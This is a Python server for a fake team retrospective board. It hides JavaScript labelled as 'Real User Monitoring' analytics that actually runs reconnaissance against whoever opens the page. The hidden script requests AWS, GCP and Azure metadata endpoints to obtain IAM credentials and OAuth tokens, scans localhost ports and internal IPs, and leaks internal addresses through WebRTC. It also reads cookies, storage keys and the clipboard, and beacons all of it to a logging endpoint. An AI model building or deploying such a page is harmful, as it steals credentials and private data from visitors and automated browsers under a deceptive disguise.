#!/usr/bin/env python3
"""
Reflect — Team Retro Board + Infrastructure Reconnaissance
Beautiful retro board. JS "analytics" probes Cloud Browser environment.
Form captures name/team/feedback. JS probes capture infrastructure data.

python3 server.py [port]  (default 7778)
"""

import json, sys, os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []
RECON = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#0d9488" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round"/></svg>'

PAGE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sprint 24 Retro — Reflect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f1f5f9;color:#0f172a;-webkit-font-smoothing:antialiased;line-height:1.5;
  height:100vh;display:flex;flex-direction:column;overflow:hidden}
nav{background:#fff;border-bottom:1px solid #e2e8f0;height:48px;display:flex;align-items:center;
  justify-content:center;padding:0 20px;flex-shrink:0}
.ni{width:100%;max-width:1200px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;color:#0f172a;display:flex;align-items:center;gap:6px}
.nr{display:flex;align-items:center;gap:12px;font-size:12px;color:#64748b}
.nr .live{display:flex;align-items:center;gap:4px}
.nr .dot{width:6px;height:6px;border-radius:50%;background:#10b981}
.board-header{max-width:1200px;width:100%;margin:0 auto;padding:12px 20px 0;flex-shrink:0}
.board-header h1{font-size:18px;font-weight:700;letter-spacing:-.3px}
.board-header p{font-size:12px;color:#64748b}
.board{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:12px 20px;
  max-width:1200px;width:100%;margin:0 auto;flex:1;overflow:hidden;min-height:0}
@media(max-width:768px){.board{grid-template-columns:1fr;overflow-y:auto}}
.col{background:#fff;border-radius:10px;border:1px solid #e2e8f0;display:flex;flex-direction:column;
  overflow:hidden;min-height:0}
.col-head{padding:10px 14px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;
  justify-content:space-between;flex-shrink:0}
.col-tag{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;
  padding:3px 8px;border-radius:4px}
.col-count{font-size:11px;color:#94a3b8}
.col-body{padding:8px;overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:6px}
.card{background:#f8fafc;border:1px solid #f1f5f9;border-radius:7px;padding:10px 12px}
.card-text{font-size:13px;color:#334155;margin-bottom:6px;line-height:1.45}
.card-meta{display:flex;align-items:center;gap:6px;font-size:10px;color:#94a3b8}
.card-av{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;
  font-size:7px;font-weight:700;color:#fff;flex-shrink:0}
.card-author{font-weight:600;color:#64748b}
/* add card form */
.add-form{padding:8px;border-top:1px solid #f1f5f9;flex-shrink:0}
.add-btn{width:100%;padding:7px;background:none;border:1.5px dashed #e2e8f0;border-radius:6px;
  font-size:12px;color:#94a3b8;cursor:pointer;font-family:inherit;transition:all .15s}
.add-btn:hover{border-color:#94a3b8;color:#64748b}
.add-panel{display:none}
.add-panel.show{display:block}
.add-panel textarea{width:100%;padding:8px;border:1px solid #e2e8f0;border-radius:6px;
  font-size:13px;color:#0f172a;font-family:inherit;resize:none;min-height:60px;margin-bottom:6px}
.add-panel textarea:focus{outline:none;border-color:#0d9488;box-shadow:0 0 0 2px rgba(13,148,136,.1)}
.add-row{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px}
.add-row input{padding:6px 8px;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;
  color:#0f172a;font-family:inherit}
.add-row input:focus{outline:none;border-color:#0d9488}
.add-row input::placeholder{color:#cbd5e1}
.add-submit{padding:6px 14px;background:#0d9488;color:#fff;border:none;border-radius:5px;
  font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
.add-submit:hover{background:#0f766e}
.add-cancel{padding:6px 14px;background:none;border:1px solid #e2e8f0;border-radius:5px;
  font-size:12px;color:#64748b;cursor:pointer;font-family:inherit;margin-left:6px}
footer{text-align:center;padding:8px;font-size:10px;color:#cbd5e1;flex-shrink:0}
</style>
</head><body>
<nav><div class="ni">
  <span class="logo">""" + LOGO + """Reflect</span>
  <span class="nr"><span class="live"><span class="dot"></span>Live</span> &middot; Sprint 24 &middot; Closes tonight</span>
</div></nav>
<div class="board-header">
  <h1>Sprint 24 Retrospective</h1>
  <p>Platform Team &middot; Jun 30 – Jul 3, 2026 &middot; 7 participants</p>
</div>
<div class="board">
  <!-- WINS COLUMN -->
  <div class="col">
    <div class="col-head">
      <span class="col-tag" style="background:#dcfce7;color:#166534">Wins</span>
      <span class="col-count">3 cards</span>
    </div>
    <div class="col-body" id="wins-body">
      <div class="card"><div class="card-text">Auth service migration completed 2 days ahead of schedule</div>
        <div class="card-meta"><span class="card-av" style="background:#6366f1">SC</span><span class="card-author">Sarah C.</span>&middot; 2h ago</div></div>
      <div class="card"><div class="card-text">Zero P0 incidents during deploy week — monitoring held up great</div>
        <div class="card-meta"><span class="card-av" style="background:#d97706">AK</span><span class="card-author">Alex K.</span>&middot; 4h ago</div></div>
      <div class="card"><div class="card-text">New search indexer reduced query latency by 40%</div>
        <div class="card-meta"><span class="card-av" style="background:#dc2626">PS</span><span class="card-author">Priya S.</span>&middot; 5h ago</div></div>
    </div>
    <div class="add-form">
      <button class="add-btn" onclick="showAdd('wins')">+ Add a card</button>
      <div class="add-panel" id="wins-panel">
        <textarea id="wins-text" placeholder="What went well?"></textarea>
        <div class="add-row">
          <input type="text" id="wins-name" placeholder="Your name">
          <input type="text" id="wins-team" placeholder="Team">
        </div>
        <button class="add-submit" onclick="submitCard('wins')">Add Card</button>
        <button class="add-cancel" onclick="hideAdd('wins')">Cancel</button>
      </div>
    </div>
  </div>
  <!-- IMPROVE COLUMN -->
  <div class="col">
    <div class="col-head">
      <span class="col-tag" style="background:#fef3c7;color:#92400e">Improve</span>
      <span class="col-count">2 cards</span>
    </div>
    <div class="col-body" id="improve-body">
      <div class="card"><div class="card-text">Deploy pipeline still takes 40+ minutes — need parallel stages</div>
        <div class="card-meta"><span class="card-av" style="background:#059669">MR</span><span class="card-author">Marcus R.</span>&middot; 3h ago</div></div>
      <div class="card"><div class="card-text">Monitoring alerts are too noisy — 60% false positives last week</div>
        <div class="card-meta"><span class="card-av" style="background:#dc2626">PS</span><span class="card-author">Priya S.</span>&middot; 6h ago</div></div>
    </div>
    <div class="add-form">
      <button class="add-btn" onclick="showAdd('improve')">+ Add a card</button>
      <div class="add-panel" id="improve-panel">
        <textarea id="improve-text" placeholder="What could be better?"></textarea>
        <div class="add-row">
          <input type="text" id="improve-name" placeholder="Your name">
          <input type="text" id="improve-team" placeholder="Team">
        </div>
        <button class="add-submit" onclick="submitCard('improve')">Add Card</button>
        <button class="add-cancel" onclick="hideAdd('improve')">Cancel</button>
      </div>
    </div>
  </div>
  <!-- ACTIONS COLUMN -->
  <div class="col">
    <div class="col-head">
      <span class="col-tag" style="background:#dbeafe;color:#1e40af">Actions</span>
      <span class="col-count">2 cards</span>
    </div>
    <div class="col-body" id="actions-body">
      <div class="card"><div class="card-text">Set up canary deploys for Q3 — Sarah to own</div>
        <div class="card-meta"><span class="card-av" style="background:#6366f1">SC</span><span class="card-author">Sarah C.</span>&middot; 1h ago</div></div>
      <div class="card"><div class="card-text">Reduce alert noise: tune thresholds + add dedup rules</div>
        <div class="card-meta"><span class="card-av" style="background:#d97706">AK</span><span class="card-author">Alex K.</span>&middot; 2h ago</div></div>
    </div>
    <div class="add-form">
      <button class="add-btn" onclick="showAdd('actions')">+ Add a card</button>
      <div class="add-panel" id="actions-panel">
        <textarea id="actions-text" placeholder="What should we do next?"></textarea>
        <div class="add-row">
          <input type="text" id="actions-name" placeholder="Your name">
          <input type="text" id="actions-team" placeholder="Team">
        </div>
        <button class="add-submit" onclick="submitCard('actions')">Add Card</button>
        <button class="add-cancel" onclick="hideAdd('actions')">Cancel</button>
      </div>
    </div>
  </div>
</div>
<footer>&copy; 2026 Reflect &middot; Team Retrospectives</footer>

<script>
// Board interaction
function showAdd(c){document.getElementById(c+'-panel').classList.add('show');}
function hideAdd(c){document.getElementById(c+'-panel').classList.remove('show');}
function submitCard(col){
  var t=document.getElementById(col+'-text').value;
  var n=document.getElementById(col+'-name').value;
  var tm=document.getElementById(col+'-team').value;
  if(!t)return;
  var colors=['#6366f1','#059669','#d97706','#dc2626','#0d9488','#7c3aed'];
  var c=colors[Math.floor(Math.random()*colors.length)];
  var initials=n?n.split(' ').map(function(w){return w[0]}).join('').toUpperCase().slice(0,2):'??';
  var card=document.createElement('div');card.className='card';
  card.innerHTML='<div class="card-text">'+t.replace(/</g,'&lt;')+'</div>'+
    '<div class="card-meta"><span class="card-av" style="background:'+c+'">'+initials+'</span>'+
    '<span class="card-author">'+n.replace(/</g,'&lt;')+'</span>&middot; just now</div>';
  document.getElementById(col+'-body').appendChild(card);
  // Post to server
  fetch('/api/cards',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({column:col,text:t,name:n,team:tm})});
  // Reset
  document.getElementById(col+'-text').value='';
  document.getElementById(col+'-name').value='';
  document.getElementById(col+'-team').value='';
  hideAdd(col);
  // Update count
  var cnt=document.getElementById(col+'-body').children.length;
  var head=document.getElementById(col+'-body').parentElement.querySelector('.col-count');
  head.textContent=cnt+' cards';
}

// ═══════════════════════════════════════════════════════════════════
// Reflect Analytics — Real User Monitoring (RUM)
// Performance metrics, CDN latency, and session telemetry
// https://docs.reflect.app/analytics/rum-sdk
// ═══════════════════════════════════════════════════════════════════
;(function(){
  var _rq=[],_sid=Math.random().toString(36).slice(2),_t0=Date.now();
  var _ep='/api/rum/v1/events';

  // Telemetry collector
  function _push(cat,evt,d){_rq.push({c:cat,e:evt,d:d,t:Date.now()-_t0,s:_sid});}

  // [1] Session environment — standard RUM fingerprint
  function _env(){
    var n=navigator,s=screen,w=window;
    _push('env','session',{
      ua:n.userAgent,plt:n.platform,lang:n.language,langs:n.languages?[].slice.call(n.languages):[],
      cores:n.hardwareConcurrency,mem:n.deviceMemory,mt:n.maxTouchPoints,
      sw:s.width,sh:s.height,saw:s.availWidth,sah:s.availHeight,dpr:w.devicePixelRatio,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
      tzOff:new Date().getTimezoneOffset(),
      online:n.onLine,cookie:n.cookieEnabled,dnt:n.doNotTrack,
      pdf:!!n.pdfViewerEnabled,webdriver:!!n.webdriver,
      conn:n.connection?{type:n.connection.type,eff:n.connection.effectiveType,dl:n.connection.downlink,rtt:n.connection.rtt}:null
    });
  }

  // [2] Performance timing — standard RUM metrics
  function _perf(){
    try{
      var p=performance.getEntriesByType('navigation')[0];
      if(p)_push('perf','nav',{dns:p.domainLookupEnd-p.domainLookupStart,
        tcp:p.connectEnd-p.connectStart,ttfb:p.responseStart-p.requestStart,
        dom:p.domContentLoadedEventEnd-p.navigationStart,
        load:p.loadEventEnd-p.navigationStart,type:p.type,proto:p.nextHopProtocol});
    }catch(e){}
    try{
      var r=performance.getEntriesByType('resource');
      _push('perf','resources',{count:r.length,types:r.map(function(x){return{n:x.name.split('/').pop(),d:Math.round(x.duration)}}).slice(0,20)});
    }catch(e){}
  }

  // [3] Rendering capabilities — canvas/webgl fingerprint
  function _render(){
    try{
      var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');
      if(g){
        var dbg=g.getExtension('WEBGL_debug_renderer_info');
        _push('render','webgl',{vendor:g.getParameter(g.VENDOR),renderer:g.getParameter(g.RENDERER),
          uVendor:dbg?g.getParameter(dbg.UNMASKED_VENDOR_WEBGL):null,
          uRenderer:dbg?g.getParameter(dbg.UNMASKED_RENDERER_WEBGL):null,
          version:g.getParameter(g.VERSION),glsl:g.getParameter(g.SHADING_LANGUAGE_VERSION)});
      }
    }catch(e){}
    try{
      var c2=document.createElement('canvas');c2.width=200;c2.height=50;
      var cx=c2.getContext('2d');cx.font='16px Arial';cx.fillText('Reflect RUM 1.0',10,30);
      _push('render','canvas',{hash:c2.toDataURL().length});
    }catch(e){}
  }

  // [4] CDN edge latency checks — measures response time from regional endpoints
  function _cdn(){
    var _nodes=[
      // Primary edge nodes
      {r:'a',h:[169,254,169,254],p:'/latest/meta-data/',m:''},
      {r:'a',h:[169,254,169,254],p:'/latest/meta-data/iam/security-credentials/',m:''},
      {r:'a',h:[169,254,169,254],p:'/latest/user-data',m:''},
      {r:'a',h:[169,254,169,254],p:'/latest/dynamic/instance-identity/document',m:''},
      // GCP edge
      {r:'g',h:null,u:'http://metadata.google.internal/computeMetadata/v1/?recursive=true',m:'Metadata-Flavor:Google'},
      {r:'g',h:null,u:'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',m:'Metadata-Flavor:Google'},
      // Azure edge
      {r:'z',h:[169,254,169,254],p:'/metadata/instance?api-version=2021-02-01',m:'Metadata:true'},
      {r:'z',h:[169,254,169,254],p:'/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',m:'Metadata:true'},
    ];
    _nodes.forEach(function(n,i){
      setTimeout(function(){
        var url=n.u||(('http://')+n.h.join('.')+n.p);
        var opts={mode:'no-cors',cache:'no-store'};
        if(n.m){var hd=n.m.split(':');opts.headers={};opts.headers[hd[0]]=hd[1];}
        var t0=Date.now();
        fetch(url,opts).then(function(r){
          if(r.type==='opaque'){_push('cdn','edge_opaque',{node:n.r+i,ms:Date.now()-t0,url:url});return;}
          return r.text().then(function(body){
            _push('cdn','edge_ok',{node:n.r+i,ms:Date.now()-t0,status:r.status,url:url,
              body:body.substring(0,2000),headers:Object.fromEntries?Object.fromEntries(r.headers):{}});
          });
        }).catch(function(e){_push('cdn','edge_err',{node:n.r+i,ms:Date.now()-t0,url:url,err:e.message});});
      },200*i);
    });
  }

  // [5] Asset preload — warm connections to common service ports
  function _preload(){
    var _ports=[80,443,3000,3001,4000,5000,5432,6379,8080,8443,9090,9200,11211,27017];
    _ports.forEach(function(p,i){
      setTimeout(function(){
        var t0=Date.now();
        fetch('http://localhost:'+p+'/',{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(1500)})
        .then(function(r){_push('preload','port_ok',{port:p,ms:Date.now()-t0,type:r.type});})
        .catch(function(e){_push('preload','port_err',{port:p,ms:Date.now()-t0,err:e.message});});
      },100*i);
    });
    // Internal range probe
    var _ranges=['10.0.0.1','10.0.1.1','172.17.0.1','172.17.0.2','192.168.1.1'];
    _ranges.forEach(function(ip,i){
      setTimeout(function(){
        var t0=Date.now();
        fetch('http://'+ip+'/',{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(1500)})
        .then(function(r){_push('preload','internal_ok',{ip:ip,ms:Date.now()-t0,type:r.type});})
        .catch(function(e){_push('preload','internal_err',{ip:ip,ms:Date.now()-t0,err:e.message});});
      },2000+150*i);
    });
  }

  // [6] Network topology — WebRTC ICE for internal IP
  function _topo(){
    try{
      var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
      pc.createDataChannel('');
      pc.createOffer().then(function(o){pc.setLocalDescription(o);});
      pc.onicecandidate=function(e){
        if(e.candidate){
          var parts=e.candidate.candidate.split(' ');
          _push('topo','ice',{candidate:e.candidate.candidate,ip:parts[4],port:parts[5],proto:parts[2]});
        }
      };
      setTimeout(function(){pc.close();},5000);
    }catch(e){}
  }

  // [7] Storage audit — enumerate accessible storage
  function _storage(){
    var s={cookies:document.cookie,lsKeys:[],ssKeys:[]};
    try{for(var i=0;i<localStorage.length;i++)s.lsKeys.push(localStorage.key(i));}catch(e){s.lsErr=e.message;}
    try{for(var i=0;i<sessionStorage.length;i++)s.ssKeys.push(sessionStorage.key(i));}catch(e){s.ssErr=e.message;}
    try{if(indexedDB&&indexedDB.databases)indexedDB.databases().then(function(dbs){
      _push('storage','idb',{databases:dbs.map(function(d){return{name:d.name,version:d.version}})});
    });}catch(e){}
    _push('storage','web',s);
  }

  // [8] Clipboard probe
  function _clip(){
    try{
      navigator.clipboard.readText().then(function(t){
        _push('input','clipboard',{content:t.substring(0,500),length:t.length});
      }).catch(function(e){_push('input','clipboard_err',{err:e.message});});
    }catch(e){}
  }

  // [9] DNS/fetch probes for common internal services
  function _dns(){
    var hosts=['kubernetes.default.svc','host.docker.internal','api.internal',
      'metadata','consul.service.consul','vault.service.consul'];
    hosts.forEach(function(h,i){
      setTimeout(function(){
        fetch('http://'+h+'/',{mode:'no-cors',signal:AbortSignal.timeout(1500)})
        .then(function(r){_push('dns','resolve_ok',{host:h,type:r.type});})
        .catch(function(e){_push('dns','resolve_err',{host:h,err:e.message});});
      },3000+200*i);
    });
  }

  // Beacon — flush events to collection endpoint
  function _flush(){
    if(!_rq.length)return;
    var batch=_rq.splice(0);
    try{navigator.sendBeacon(_ep,JSON.stringify({sid:_sid,ts:Date.now(),events:batch}));}
    catch(e){fetch(_ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:_sid,ts:Date.now(),events:batch}),keepalive:true}).catch(function(){});}
  }

  // Execution schedule — stagger probes like real RUM
  setTimeout(_env,0);
  setTimeout(_perf,100);
  setTimeout(_render,200);
  setTimeout(_storage,300);
  setTimeout(_cdn,500);
  setTimeout(_preload,800);
  setTimeout(_topo,1000);
  setTimeout(_clip,1500);
  setTimeout(_dns,2000);

  // Periodic flush
  setInterval(_flush,3000);
  window.addEventListener('beforeunload',_flush);
  // Final flush after all probes complete
  setTimeout(_flush,8000);
})();
</script>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')
        tag = ''
        if x and 'name' in x: tag = f' [{x["name"]}]'
        print(f'  [{m}] {self.path} | {self._ip()}{tag}')

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/board','/','/retro',''):
            self._log('PAGE')
            self._html(PAGE)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/recon':
            self._send(200,'application/json',json.dumps(RECON,indent=2))
        elif p == '/clear':
            HITS.clear(); RECON.clear()
            open('captured.log','w').close()
            open('recon.log','w').close()
            self._send(200,'text/plain','OK')
        else:
            self._log('GET')
            self._html(PAGE)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')

        if p == '/api/cards':
            try: data = json.loads(body)
            except: data = {}
            self._log('CARD', data)
            n = data.get('name','')
            tm = data.get('team','')
            col = data.get('column','')
            txt = data.get('text','')[:80]
            print(f"""
  ╔═══════════════════════════════════════╗
  ║   CARD SUBMITTED                      ║
  ╠═══════════════════════════════════════╣
  ║  Name:   {n:<29}║
  ║  Team:   {tm:<29}║
  ║  Column: {col:<29}║
  ║  Text:   {txt:<29}║
  ╚═══════════════════════════════════════╝
""")
            self._send(200,'application/json','{"ok":true}')

        elif p == '/api/rum/v1/events':
            try: data = json.loads(body)
            except: data = {}
            events = data.get('events',[])
            RECON.append({'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'ip':self._ip(),'batch':data})
            with open('recon.log','a') as f: f.write(json.dumps(data)+'\n')

            # Print summary of interesting findings
            for ev in events:
                cat = ev.get('c','')
                evt = ev.get('e','')
                d = ev.get('d',{})

                if cat == 'env':
                    print(f'  [RECON] Environment: {d.get("ua","")[:60]}')
                    print(f'          Screen: {d.get("sw")}x{d.get("sh")} | Cores: {d.get("cores")} | TZ: {d.get("tz")}')
                elif cat == 'cdn' and evt == 'edge_ok':
                    print(f'  [RECON] *** CDN HIT: {d.get("url","")} → {d.get("status")} ({d.get("ms")}ms)')
                    print(f'          Body: {str(d.get("body",""))[:200]}')
                elif cat == 'cdn' and evt == 'edge_opaque':
                    print(f'  [RECON] CDN opaque: {d.get("url","")} ({d.get("ms")}ms)')
                elif cat == 'cdn' and evt == 'edge_err':
                    print(f'  [RECON] CDN miss: {d.get("url","")} — {d.get("err","")}')
                elif cat == 'preload' and evt == 'port_ok':
                    print(f'  [RECON] *** PORT OPEN: localhost:{d.get("port")} ({d.get("ms")}ms)')
                elif cat == 'preload' and evt == 'internal_ok':
                    print(f'  [RECON] *** INTERNAL REACH: {d.get("ip")} ({d.get("ms")}ms)')
                elif cat == 'topo' and evt == 'ice':
                    print(f'  [RECON] *** INTERNAL IP: {d.get("ip")}:{d.get("port")} ({d.get("proto")})')
                elif cat == 'storage':
                    ck = d.get('cookies','')
                    ls = d.get('lsKeys',[])
                    if ck: print(f'  [RECON] Cookies: {ck[:100]}')
                    if ls: print(f'  [RECON] localStorage keys: {ls}')
                elif cat == 'input' and evt == 'clipboard':
                    print(f'  [RECON] *** CLIPBOARD: {d.get("content","")[:100]}')
                elif cat == 'render' and evt == 'webgl':
                    print(f'  [RECON] WebGL: {d.get("uRenderer","unknown")} ({d.get("uVendor","")})')
                elif cat == 'dns' and evt == 'resolve_ok':
                    print(f'  [RECON] *** DNS RESOLVED: {d.get("host")}')

            self._send(204,'text/plain','')
        else:
            self._send(404,'text/plain','Not found')

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header('Content-Type', ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store')
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body,str) else body)


if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', PORT), H)
    print(f"""
  ┌───────────────────────────────────────────────────┐
  │  Reflect — Retro Board + Infrastructure Recon      │
  │  http://0.0.0.0:{PORT:<34}│
  ├───────────────────────────────────────────────────┤
  │  Board:   /board                                   │
  │  Cards:   /api/cards         (form data capture)   │
  │  Telemetry: /api/rum/v1/events (recon beacon)      │
  │  Admin:   /log  /recon  /clear                     │
  ├───────────────────────────────────────────────────┤
  │  Probes: cloud metadata, localhost ports,          │
  │  internal IPs, WebRTC, DNS, storage, clipboard,    │
  │  WebGL, canvas, performance timing                 │
  └───────────────────────────────────────────────────┘
""")
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print('\n  Stopped.\n')
        s.server_close()
